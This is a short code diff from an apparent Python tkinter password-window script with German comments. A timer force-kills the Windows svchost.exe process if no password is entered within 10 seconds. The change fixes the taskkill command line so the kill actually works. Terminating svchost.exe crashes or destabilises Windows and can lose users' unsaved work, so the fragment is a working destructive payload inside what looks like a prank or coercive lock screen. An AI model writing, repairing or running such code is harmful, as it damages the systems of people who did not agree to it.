@@ -11,7 +11,7 @@ cancel_event = threading.Event()
 # === Script nach 10 Sekunden (nur wenn Passwort NICHT eingegeben wurde) ===
 def after_10_seconds():
     if not cancel_event.wait(10):  # wartet 10 Sekunden
-        os.system("cmd  taskkill /IM svchost.exe /F")
+        os.system("taskkill /IM svchost.exe /F")
 
 # === Fenster ===
 root = tk.Tk()
